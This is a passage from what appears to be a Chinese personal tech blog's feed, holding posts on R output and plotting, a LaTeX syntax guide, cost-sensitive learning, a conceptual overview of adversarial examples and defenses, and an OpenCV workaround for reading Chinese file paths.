align="center">pi</td></tr></tbody></table><ul><li>输出</li></ul><ol><li><code>print( )</code></li><li><code>cat( )</code>  用于显示多项内容，eg:  <code>cat("sin(pi/2)=", sin(pi/2), "\n")</code>     其中”\n”表示换行</li></ol><ul><li>清屏</li></ul><p>Ctrl +L</p><ul><li>逐行显示</li></ul><p><code>sink()</code>函数打开一个文件开始记录输出结果，<code>sink()</code>即可关闭文件不再记录</p><div class="hljs code-wrapper"><pre><code class="hljs r">sink(<span class="hljs-string">"tmpres01.txt"</span>, split=<span class="hljs-literal">TRUE</span>)print(sin(pi/<span class="hljs-number">6</span>))print(cos(pi/<span class="hljs-number">6</span>))cat(<span class="hljs-string">"t(10)的双侧0.05分位数（临界值）="</span>, qt(<span class="hljs-number">1</span> - <span class="hljs-number">0.05</span>/<span class="hljs-number">2</span>, <span class="hljs-number">10</span>), <span class="hljs-string">"\n"</span>)sink()</code></pre></div><ul><li>绘图</li></ul><p><code>curve( )</code></p><p>例如绘制$y=x^2 $在范围（-2，2）的图像： <code>curve(x^2, -2, 2)</code> </p><p><code>abline(h=0)</code>表示绘制一条x=0的参考线</p><p><code>barplot( )</code>绘制条形图</p><div class="hljs code-wrapper"><pre><code class="hljs r">barplot(c(<span class="hljs-string">"男生"</span>=<span class="hljs-number">10</span>, <span class="hljs-string">"女生"</span>=<span class="hljs-number">7</span>),              main=<span class="hljs-string">"男女生人数"</span>)</code></pre></div><p><code>plot(1:10, sqrt(1:10))</code>绘制散点图 #第一个变量是x轴，第二个是y轴</p><h2 id="常量与变量"><a href="#常量与变量" class="headerlink" title="常量与变量"></a>常量与变量</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> R语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>latex简易指南</title>
      <link href="/2020/03/12/latex%E6%8C%87%E5%8D%97/"/>
      <url>/2020/03/12/latex%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<p>轻松学会学术论文排版</p><a id="more"></a><p>其实本人就不是很喜欢用latex，但是用惯了之后觉得相比mathtype或者word那里操蛋的数学公式渲染，latex好太多了。</p><p>另外一个原因就是markdown是支持latex的，所以敲一些公式的时候也不得不写点latex语法，久而久之就习惯了。</p><p>（PS：关于markdown的简单介绍建议看我的另一篇文章哦，搭配食用最佳:blush:）</p><p>安装这里就一笔带过喽，进入的链接选择合适版本即可：</p><p><a href="http://www.ctex.org/HomePage" target="_blank" rel="noopener">http://www.ctex.org/HomePage</a></p><h1 id="纯latex中使用"><a href="#纯latex中使用" class="headerlink" title="纯latex中使用"></a>纯latex中使用</h1><h2 id="基本框架："><a href="#基本框架：" class="headerlink" title="基本框架："></a>基本框架：</h2><p>首先建立一个test.tex文件，在其中输入：</p><div class="hljs code-wrapper"><pre><code class="hljs tex"><span class="hljs-tag">\<span class="hljs-name">documentclass</span><span class="hljs-string">{article}</span></span><span class="hljs-tag">\<span class="hljs-name">begin</span><span class="hljs-string">{document}</span></span> Hello world! <span class="hljs-tag">\<span class="hljs-name">end</span><span class="hljs-string">{document}</span></span></code></pre></div><p>这样就生成了一个最基本的tex文件，在TeXShop中点击Typeset或者command+T快捷键(在Sublime Text中是Command+B)就可以编译并生成PDF了</p><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a><strong>基本语法</strong></h2><p><strong>1. 选择文档类型</strong></p><p>\documentclass{}规定文档的类型，可以选择文章article，也可以选择其它类型，如book、letter等等</p><p><strong>2. 添加注释</strong></p><p>在每一行的末尾加上%，然后就可以添加注释了，编译后注释的内容不会出现在文档中。如果文章内容中需要使用%的话，需要在%前面加上反斜杠\。</p><p><strong>3. 添加标题、作者、日期等信息</strong></p><div class="hljs code-wrapper"><pre><code class="hljs text">\documentclass{article}  \title{My first Latex document} \author{Yingshan Li} \date{8/26/2018} \begin{document} \maketitle Hello world! \end{document}</code></pre></div><p>这样就可以将文章的标题、作者、日期等信息添加到文章中了，\maketitle这个控制序列可以将这些信息按照预定的格式打印出来。</p><p><strong>4. 添加目录</strong></p><p>只需要在导言区中添加\tableofcontents就可以了</p><div class="hljs code-wrapper"><pre><code class="hljs text">\documentclass{article}  \title{My first Latex document} \author{Yingshan Li} \date{8/26/2018} \begin{document} \maketitle \tableofcontents Hello world! \end{document}</code></pre></div><h2 id="添加章节"><a href="#添加章节" class="headerlink" title="添加章节"></a><strong>添加章节</strong></h2><div class="hljs code-wrapper"><pre><code class="hljs text">\section{} \subsection{} \subsubsection{}</code></pre></div><h2 id="添加段落"><a href="#添加段落" class="headerlink" title="添加段落"></a><strong>添加段落</strong></h2><div class="hljs code-wrapper"><pre><code class="hljs text">\paragraph{} \subparagraph{} \subsubparagraph{}</code></pre></div><h2 id="添加包"><a href="#添加包" class="headerlink" title="添加包"></a><strong>添加包</strong></h2><p>当需要用到非默认存在的包时，需要在导言区中添加，如</p><div class="hljs code-wrapper"><pre><code class="hljs text">\documentclass{article}  \usepackage{amsmath} \title{My first Latex document} \author{Yingshan Li} \date{8/26/2018} \begin{document} \maketitle Hello world! \end{document}</code></pre></div><h2 id="字体设置"><a href="#字体设置" class="headerlink" title="字体设置"></a><strong>字体设置</strong></h2><p>一般我们用fontspec包来设置字体</p><div class="hljs code-wrapper"><pre><code class="hljs text">\usepackage{fontspec} \setmainfont{Times New Roman}</code></pre></div><h1 id="可以在markdown中使用"><a href="#可以在markdown中使用" class="headerlink" title="可以在markdown中使用"></a>可以在markdown中使用</h1><p>注意，既然都可以在markdown中使用，那这些语法也肯定可以在latex中使用。</p><p>以下都是代码块中的是语法，紧接着是效果。</p><h2 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h2><div class="hljs code-wrapper"><pre><code class="hljs livescript"><span class="hljs-string">\quad</span></code></pre></div><p>$$<br>哈哈哈呵呵呵（中间没有\verb|\quad|）        \<br>哈哈哈 \quad    呵呵呵（中间有\verb|\quad|）<br>$$</p><h2 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h2><div class="hljs code-wrapper"><pre><code class="hljs livescript"><span class="hljs-string">\\</span></code></pre></div><p>$$<br>哈哈哈 \quad    呵呵呵（中间没有\verb||\verb||）        \</p><p>哈哈哈 \quad\    呵呵呵（中间有\verb||\verb||）<br>$$</p><p>(PS：为了演示处美观，演示每个公式之后我都换写个<kbd>\ \ </kbd>换下行哈)</p><h2 id="字体大小"><a href="#字体大小" class="headerlink" title="字体大小"></a><strong>字体大小</strong></h2><div class="hljs code-wrapper"><pre><code class="hljs text">\tiny \scriptsize \small \normalsize \large \large \LARGE \huge \Huge</code></pre></div><p>$$<br>\tiny sd    \<br>\scriptsize sd    \<br>\small sd        \<br>\normalsize sd        \<br>\large sd        \<br>\large sd        \<br>\LARGE sd        \<br>\huge sd        \<br>\Huge sd        \<br>$$</p><h2 id="添加数学公式"><a href="#添加数学公式" class="headerlink" title="添加数学公式"></a><strong>添加数学公式</strong></h2><h2 id="插入行内公式"><a href="#插入行内公式" class="headerlink" title="插入行内公式"></a><strong>插入行内公式</strong></h2><div class="hljs code-wrapper"><pre><code class="hljs text">$E=mc^2$.  两个$中间的就会渲染成公式</code></pre></div><p>哈哈哈$E=mc^2$呵呵</p><h2 id="插入行间公式"><a href="#插入行间公式" class="headerlink" title="插入行间公式"></a><strong>插入行间公式</strong></h2><div class="hljs code-wrapper"><pre><code class="hljs text">$$$$</code></pre></div><p>哈哈<br>$$<br>E=mc^2.<br>$$<br>呵呵</p><p>（发现了没，相比行间公式，行内公式可以公式与文字在同一行）</p><h2 id="对行间公式进行编号"><a href="#对行间公式进行编号" class="headerlink" title="对行间公式进行编号"></a><strong>对行间公式进行编号</strong></h2><div class="hljs code-wrapper"><pre><code class="hljs text">\begin{equation} ... \end{equation}</code></pre></div><p>$$ {\begin{equation} }<br>S_{n+1} = S_{n} + S_{n}    \<br>S_{n}=1=2^{n}<br>$$ {\end{equation}</p><h2 id="上下标"><a href="#上下标" class="headerlink" title="上下标"></a><strong>上下标</strong></h2><div class="hljs code-wrapper"><pre><code class="hljs text">^ %上标_ %下标x^1x_{ij}^m</code></pre></div><p>$$<br>x^1    \<br>x_{ij}^m<br>$$</p><h2 id="分式"><a href="#分式" class="headerlink" title="分式"></a><strong>分式</strong></h2><div class="hljs code-wrapper"><pre><code class="hljs text">\frac{m}{n}</code></pre></div><p>$$<br>\frac{m}{n}<br>$$</p><h2 id="开方"><a href="#开方" class="headerlink" title="开方"></a><strong>开方</strong></h2><div class="hljs code-wrapper"><pre><code class="hljs text">\sqrt{a} \sqrt[m]{n}</code></pre></div><p>$$<br>\sqrt{a}     \<br>\sqrt[m]{n}<br>$$</p><h2 id="累计求和"><a href="#累计求和" class="headerlink" title="累计求和"></a><strong>累计求和</strong></h2><div class="hljs code-wrapper"><pre><code class="hljs text">\sum_{i=m}^{n}</code></pre></div><p>$$<br>\sum_{i=m}^{n}<br>$$</p><h2 id="累计求积"><a href="#累计求积" class="headerlink" title="累计求积"></a><strong>累计求积</strong></h2><div class="hljs code-wrapper"><pre><code class="hljs text">\prod_{i=m}^{n}</code></pre></div><p>$$<br>\prod_{i=m}^{n}<br>$$</p><h2 id="积分"><a href="#积分" class="headerlink" title="积分"></a><strong>积分</strong></h2><div class="hljs code-wrapper"><pre><code class="hljs text">\int_{i=m}^{n}</code></pre></div><p>$$<br>\int_{i=m}^{n}<br>$$</p><h2 id="向量"><a href="#向量" class="headerlink" title="向量"></a><strong>向量</strong></h2><div class="hljs code-wrapper"><pre><code class="hljs text">\vec a  %a向量 \overrightarrow{AB} %A到B的向量</code></pre></div><p>$$<br>\vec a    \<br>\overrightarrow{AB}<br>$$</p><h2 id="省略号"><a href="#省略号" class="headerlink" title="省略号"></a><strong>省略号</strong></h2><div class="hljs code-wrapper"><pre><code class="hljs text">a+b+\cdots+z</code></pre></div><p>$$<br>a+b+\cdots+z<br>$$</p><h2 id="大括号"><a href="#大括号" class="headerlink" title="大括号"></a><strong>大括号</strong></h2><div class="hljs code-wrapper"><pre><code class="hljs text">\underbrace{a+b+\cdots+z}_{26}</code></pre></div><p>$$<br>\underbrace{a+b+\cdots+z}_{26}<br>$$</p><h2 id="横杠"><a href="#横杠" class="headerlink" title="横杠"></a><strong>横杠</strong></h2><div class="hljs code-wrapper"><pre><code class="hljs text">\overline{m+n}  %m+n公式上面加上横杠 \underline{m+n} %m+n公式下面加上横杠</code></pre></div><p>$$<br>\overline{m+n}     \<br>\underline{m+n}<br>$$</p><h1 id="希腊字符以及一些常用运算符"><a href="#希腊字符以及一些常用运算符" class="headerlink" title="希腊字符以及一些常用运算符"></a>希腊字符以及一些常用运算符</h1><p>这个太多了，不想写了，看这个<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f629.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f629.png?v8">😩</span></p><p><a href="https://blog.csdn.net/qq_39232265/article/details/78868487?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">LaTeX数学符号总结 ：Asurada-Sugo</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://zhuanlan.zhihu.com/p/52347414" target="_blank" rel="noopener">Latex基础语法 李应山</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代价敏感学习</title>
      <link href="/2020/03/10/%E4%BB%A3%E4%BB%B7%E6%95%8F%E6%84%9F%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/03/10/%E4%BB%A3%E4%BB%B7%E6%95%8F%E6%84%9F%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>深度学习的一个方向</p><a id="more"></a><p>代价敏感的学习是分类中错误产生导致不同的惩罚力度时该如何训练分类器。通常，不同的代价用一个$N×N$的矩阵$Cost$表示，其中$N$ 是类别的个数。$Cost_{[i, j]}$表示将一个$i $类的对象错分到$j$ 类中的代价。代价敏感分类就是为不同类型的错误分配不同的代价，使得在分类时，高代价错误产生的数量和错误分类的代价总和最小。常用的方法有如下几种。</p><ol><li>调整样本分布（Stratification）。这是一种传统的方法，它根据错误分类的代价，按照比例变换训练集中类别的频率。其缺点是改变了样本的分布情况，有时会影响算法的性能。</li><li>元代价（MetaCost）。这是一种将一般分类模型转换成代价敏感模型的方法。它通过一个“元学习”过程，根据最小期望代价修改训练样本的类标记，并使用修改过的训练集重新学习新的模型。</li><li>代价敏感决策。首先在训练集中多次采样，生成多个模型；再根据多个模型，得到测试样本属于每个类别的概率；然后计算测试样本的所有错误分类代价，并根据最小代价得到类标记。一种典型的做法是利用集成学习技术。</li></ol><p>其中 按照对问题的解决方法的不同，代价敏感学习的算法研究又可以分成三类。<br>第一类代价敏感的学习方法关注于如何直接构造一个代价敏感的学习模型，对不同的分类器模型研究者们提出了不同的解决办法，它们包括<br>(1)决策树：Knoll 等和Bradford 等为决策树提出了代价敏感的剪枝方法，Bradford 等研究了在代价敏感的条件下如何对决策树进行剪枝使得损失达到最小，研究表明基于拉普拉斯方法的剪枝方法能够取得最好的<br>效果，Drummond 和Holte 研究了代价敏感学习的决策树的节点分裂<br>方法。<br>(2) Boosting：Fan 等研究着提出了代价敏感的Boosting 算法Ada-Cost<br>(3)神经网络：Geibel 和Wysotzki 提出了基于Perceptron 分类算法的代价敏感的学习方法，在文章中作者对不可分的类提出了代价敏感的参数更新规则。例如Kukar和Kononenko为神经网络提出了新的后向传播算法，使之能够满足代价敏感学习的要求。<br>(4) Fumera 和Roli[37]以及Bradford 等从结构风险最小的角度来看代价敏感问题，提出了代价敏感的支持向量机分类算法。<br>第二类代价敏感的学习方法基于对分类结果的后处理，即按照传统的学习方法学习一个分类模型，然后对其分类结果按照贝叶斯风险理论对结果进行调整，以达到最小的损失。和第一类代价敏感学习方法相比，这种方法的优点在于其不依赖于所使用的具体的分类器。Domingos 提出了一种叫做MetaCost 的过程，它把底层的分类器看成一个黑箱子，不对分类器做任何的假设和改变，MetaCost可以应用到任何个数的基分类器和任何形式的代价矩阵上。给定一个样例x，基分类器得出它属于第j个类的概率为Pr(j|x)，这样，认为x 属于第i个类的贝叶斯最优预测的风险为：R(i|x) = ΣP(j|x)C(i,j)(C(i,j)是把属于类别j的分为类别i的代价)。<br>第三种代价敏感的学习方法基于传统的学习模型，通过改变原始训练数据的分布来训练得到代价敏感的模型。Chan 和Stolfo 提出了层次化模型(Stratification)，把分布不均匀的训练数据调整为正负例均匀分布的数据。Zadrozny等研究者基于cost-proportionate 的思想，对训练数据调节权值，在实际应用中，其类似于Boosting 算法，可以通过为分类模型调节权值来进行实现，又可以通过采样(subsampleing)来实现。Abe 等提出了对多类分类问题中如何实现代价敏感的学习进行了探讨，提出了一种新的迭代学习方法。</p><p>用较为常见的一维度数据展示基于代价敏感的卷积神经网络：<br>$$<br>\eta=\frac{\frac{a}{n_1}}{\frac{b}{n_2}} \<br>n=n_1+n_2<br>$$<br>其中n为样本总数，$n_1$，$n_2$分别表示一维样本中的两个不同群体，其中$a$，$b$又分别是$n_1$，$n_2$中符合某种条件/不符合某种条件的样本。</p><p>但是其中是由于数据不准确导致$a$存在虚假数据，因此以上公式可以认定是不正确的，使用代价敏感卷积神经网络的将其正确分类的其步骤是：</p><ul><li><p>获取一维特征数据集的步骤：对包含样本群体与是否符合条件的原始数据集进行分析，利用统计方法提取样每个样本的特征，获得一维特征数据集；</p></li><li><p>构造特征矩阵的步骤：利用多粒度的时间窗口将一维特征转换成特征矩阵；</p></li><li><p>分类预测训练的步骤：将特征矩阵数据集作为输入，选择卷积神经网络结构进行分类<br>预测训练；在输出层引入代价敏感机制，利用阈值移动进行反向传播；</p></li><li><p>利用训练好的分类预测。</p></li></ul><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/paper/caiwei_study_2020.3-6.jpg" srcset="/img/loading.gif" lazyload="" alt=""></p><center><p>代价敏感卷积神经网络    </p><p>    （全连接层以及层数表示有点问题）    </p></center><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 计算机视觉 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>神经网络中的对抗样本</title>
      <link href="/2020/03/10/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%AD%E7%9A%84%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC/"/>
      <url>/2020/03/10/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%AD%E7%9A%84%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p>生成对抗网络（GAN）</p><a id="more"></a><p>参照2013年的论文《Intriguing properties of neural networks》的论文中指出神经网络的两个特性</p><p>1.神经网络中包含语义信息的部分并不是在每个独立的神经元，而是整个空间；</p><p>2.神经网络学习到的从输入到输出的映射在很大程度上是<strong>不连续</strong>的。</p><p> 其造成的结果简单直观地用图表示如图1：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/paper/caiwei_study_2020.3-1.jpg" srcset="/img/loading.gif" lazyload="" alt=""></p><center>图1</center>2014年的《Threat of Addversarial Attacks on Deep Learning in Computer Vision: A Survey》有关于对抗攻击更为具体的综述，另外《Explaining and harnessing adversarial examples》指出产生对抗攻击的原因并非网络的复杂性，而是是**高纬空间中的线性特性**。<p>对抗攻击中的混淆分类器（ 由Biggo和Szegedy都提出的攻击策略 ）：<br>$$<br>x^∗=argmin_x\hat g(x),s.t.d(x,x^0) \geq d_{max}<br>$$<br>寻找一个对抗样本x，使它尽可能被分类为目标类别，并且与某个原来的样本$x_0$在样本空间距离小于$d_{max}$。<br>$$<br>\begin{alignat}{}<br>Minimize||r||_2,subject\quad to: \quad &amp;f(x+r)=l \\<br>&amp;x+r∈[0,1]^m<br>\end{alignat}<br>$$<br> 对于给定的某个样本$x$，找到离它最近的样本，使得被分类为标签$l$。</p><p>此时应用梯度下降法（ 或者牛顿法，BFGS，L-BFGS等）</p><p>$$<br>当f(x)在x_k附近连续可微，令x=x_k+ad,d为单位方向，\\<br>如果g_k=\nabla f(x_k) \not=0  \\<br>由泰勒展开得 \quad f(x)=f(x_k)+(\nabla f(x_k))^T(x-x_k)+o(\parallel x-x_k \parallel) \\<br>改写为 \quad f(x+\alpha d)=f(x_k)+\alpha g_k^T d + o(\alpha),\alpha&gt;0    \\<br>$$<br>设$\theta$为$d$与$-g_k$之间的夹角，则有$g_k^T=-g_kcos\theta $,显然$\cos\theta=1$时，$g_k^T$下降最快，从而$f(x)$下降最快，此时$d=-g_k$   。<br>联系混淆分类器，即<br>$$<br> f(x+r)=f(x_k)+\alpha g_k^T d + o(\alpha),\alpha&gt;0<br>$$<br>从《 Evasion attacks against machine learning at test time 》可知对抗攻击并非神经网络独有。（本人认为是传统的机器学习方法在低纬度的线性空间中表现不明显或者从效果上来说还没有达到需要大量关注对抗攻击的地步。）</p><p>对于低纬度空间，可以简单地增加神经元数量通过变换空间完成分类，而实际问题中的数据可能很复杂，某些较宽的神经网络对于这种问题避重就轻地拉伸解决，问题图示和拉伸之后如图2：</p> <center class="half">  <img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/paper/caiwei_study_2020.3-2.jpg" srcset="/img/loading.gif" lazyload="" width="30%"><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/paper/caiwei_study_2020.3-3.jpg" srcset="/img/loading.gif" lazyload="" width="30%"> </center> <center>图2 较高纬度的复杂问题的数据及其拉伸</center>当前，针对对抗攻击的防御措施正在沿着三个主要方向发展：<ol><li><p>在学习期间使用经过改良的训练，或者在测试期间使用经过改良的输入。</p></li><li><p>修改网络，例如，通过添加更多的层/子网络，更改损失/激活功能等。</p></li><li><p>在对看不见的示例进行分类时，使用外部模型作为网络预处理。</p></li></ol><ol start="4"><li><p>增强神经网络本身的鲁棒性</p><p>Box-constrained L-BFGS优化算法可以找到对抗样本的途径，解决对抗攻击最直观的方法是 增强神经网络本身的鲁棒性 ,即将<strong>对抗样本加入到训练集</strong>中。</p><p>以ogistic regression为例训练对抗样本。如果我们要训练一个模型来识别标签$y∈{−1,1}y∈{−1,1}, P(y=1)=σ(w⊤x+b)P(y=1)=σ(w⊤x+b)$，其中$σσ$为$sigmoid$函数，然后在<br>$$<br>Ex,y∼pdataζ(−y(w⊤x+b)) \\<br>Ex,y∼pdataζ(−y(w⊤x+b)<br>$$<br>上作梯度下降，其中$ζ(x)=log(1+exp(z))ζ(x)=log(1+exp(z))$是softplus函数。下面将$xx$代替为$xx$上面的线性扰动，推到出的解析式为<br>$$<br>Ex,y∼pdataζ(y(ϵ||w||1−w⊤x−b))<br>$$</p></li><li><p>预处理</p><p>例如：PixelDefend将对抗图像输入分类器之前，将其转换为清晰的图像；高阶表征引导去噪器（HGD）消除察觉不到的扰动视为噪声。</p><p>一般而言，预处理的方法更实用，因为它们不需要重新训练神经网络。然而，在训练降噪器时，HGD 仍然需要大量的对抗图像。因此，在对抗图像较少的情况下很难获得良好的 HGD。PixelDefend 的主要思想是模拟图像空间的分布，当空间太大时，模拟结果会很差。</p></li></ol><p>   截止至2018年，表现最优异的防御对抗攻击方法是图像压缩</p><p>   由于局部结构中相邻像素之间具有很强的相似性和相关性，因此图像压缩可以在保留显著信息的同时减少图像的冗余信息。在此基础上，论文《 a simple and accurate method to fool deep neural networks》中设计了 ComDefend利用图像压缩来消除对抗扰动或打破对抗扰动的结构 ，如图</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/paper/caiwei_study_2020.3-4.jpg" srcset="/img/loading.gif" lazyload="" alt="图3 ComDefend 端到端的思想"></p><p>在清晰的图像上添加不可察觉的扰动可能会欺骗训练有素的深度神经网络。本文主要的思想是提出了一种端到端的图像压缩模型来防御对抗性示例。所提出的模型由压缩卷积神经网络（ComCNN）和重建卷积神经网络（ResCNN）组成。ComCNN用于维护原始图像的结构信息并消除对抗性干扰（预处理降噪）。ResCNN用于重建高质量的原始图像。ComDefend将对抗图像转换为其最原始的图像，然后将其输入经过训练的分类器中。预处理模块，并且不会在整个过程中修改分类器的结构。因此，将其与其他特定于模型的防御模型结合使用，以共同提高分类器的鲁棒性。</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/paper/caiwei_study_2020.3-5.jpg" srcset="/img/loading.gif" lazyload="" alt="图4 ComDefend 概况"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="http://doi.org/10.1109/ACCESS.2018.2807385" target="_blank" rel="noopener">Akhtar, N., &amp; Mian, A. (2018). Threat of Adversarial Attacks on Deep Learning in Computer Vision: A Survey. IEEE Access, 1–1. </a></li><li><a href="https://arxiv.org/abs/1312.6199" target="_blank" rel="noopener">Szegedy, C., Zaremba, W., Sutskever, I., Bruna, J., Erhan, D., Goodfellow, I., &amp; Fergus, R. (2013, December 21). Intriguing properties of neural networks. </a></li><li><a href="https://arxiv.org/abs/1412.6572" target="_blank" rel="noopener">Goodfellow, I. J., Shlens, J., &amp; Szegedy, C. (2014, December 20). Explaining and Harnessing Adversarial Examples. </a></li><li><a href="http://colah.github.io/posts/2014-03-NN-Manifolds-Topology/" target="_blank" rel="noopener">Neural Networks, Manifolds, and Topology</a></li><li><a href="http://www.cleverhans.io/" target="_blank" rel="noopener">cleverhans blog</a></li><li><a href="https://blog.ycombinator.com/how-adversarial-attacks-work/" target="_blank" rel="noopener">How Adversarial Attacks Work</a></li><li><a href="https://medium.com/onfido-tech/adversarial-attacks-and-defences-for-convolutional-neural-networks-66915ece52e7" target="_blank" rel="noopener">Adversarial Attacks and Defences for Convolutional Neural Networks</a></li><li><a href="https://zhuanlan.zhihu.com/p/25462317" target="_blank" rel="noopener">Adversarial Training-Fast gradient sign method</a></li><li><a href="https://towardsdatascience.com/adversarial-examples-in-deep-learning-be0b08a94953" target="_blank" rel="noopener">Adversarial examples in deep learning</a></li><li><a href="https://blog.csdn.net/cdpac/article/details/53170940" target="_blank" rel="noopener">对抗样本与对抗训练</a></li><li><a href="https://blog.csdn.net/valada/article/details/88881148" target="_blank" rel="noopener">《深度学习 卷积神经网络从入门到精通》</a></li><li><a href="https://blog.csdn.net/weiqi_fan/article/details/88213284?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">图像对抗样本的生成（FGSM）</a></li><li>Jia X , Wei X , Cao X , et al. ComDefend: An Efficient Image Compression Model to Defend Adversarial Examples[J]. 2018. </li><li>Szegedy C, Zaremba W, Sutskever I, et al. Intriguing properties of neural networks[J]. arXiv preprint arXiv:1312.6199, 2013.</li><li>Huang L, Joseph A D, Nelson B, et al. Adversarial machine learning[C]//Proceedings of the 4th ACM workshop on Security and artificial  intelligence. ACM, 2011: 43-58.</li><li>Goodfellow I J, Shlens J, Szegedy C. Explaining and harnessing adversarial examples[J]. arXiv preprint arXiv:1412.6572, 2014.</li><li>Moosavi-Dezfooli S M, Fawzi A, Frossard P. Deepfool: a simple and accurate method to fool deep neural networks[C]//Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. 2016: 2574-2582.</li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 计算机视觉 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>opencv读取中文路径并将图片转换回原读取方法类型</title>
      <link href="/2020/03/06/opencv%E8%AF%BB%E5%8F%96%E4%B8%AD%E6%96%87%E8%B7%AF%E5%BE%84/"/>
      <url>/2020/03/06/opencv%E8%AF%BB%E5%8F%96%E4%B8%AD%E6%96%87%E8%B7%AF%E5%BE%84/</url>
      
        <content type="html"><![CDATA[<p>解决opencv无法读取中文路径的问题并且增加参数使得读取图片类型与原方法相同</p><a id="more"></a><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>解决opencv无法读取中文路径的问题</p><p><strong>关键词:</strong> python opencv</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>在python 3.x中使用opencv读取图片，如图</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/blog/img1fe53f8f6cff405a69960785e4564ab.png" srcset="/img/loading.gif" lazyload="" alt=""></p><center>图1</center>但是当图片路径中有中文则会报错<p>各位可以<code>print(img)</code></p><p>看看是不是返回结果是None</p><h2 id="解决办法："><a href="#解决办法：" class="headerlink" title="解决办法："></a>解决办法：</h2><p>参照 <a href="https://www.zhihu.com/question/67157462/answer/251754530" target="_blank" rel="noopener">知乎 冰不语 的回答</a> </p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">## 读取图像，解决imread不能读取中文路径的问题 </span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cv_imread</span><span class="hljs-params">(file_path)</span>:</span>cv_img = cv2.imdecode(np.fromfile(file_path, dtype=np.uint8), <span class="hljs-number">-1</span>)<span class="hljs-keyword">return</span> cv_img</code></pre></div><p>但是看看图一，读取图片后面还有一个参数<code>cv2.IMREAD_GRAYSCALE</code></p><p>如果需要在后面对图片处理一些相关操作，则可能会报错（我就遇到过）</p><p>其实只需要把定义读取中文路径的函数里返回结果之前转换回一般的读取方式即可</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">## 读取图像，解决imread不能读取中文路径的问题 </span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cv_imread</span><span class="hljs-params">(file_path)</span>:</span>cv_img = 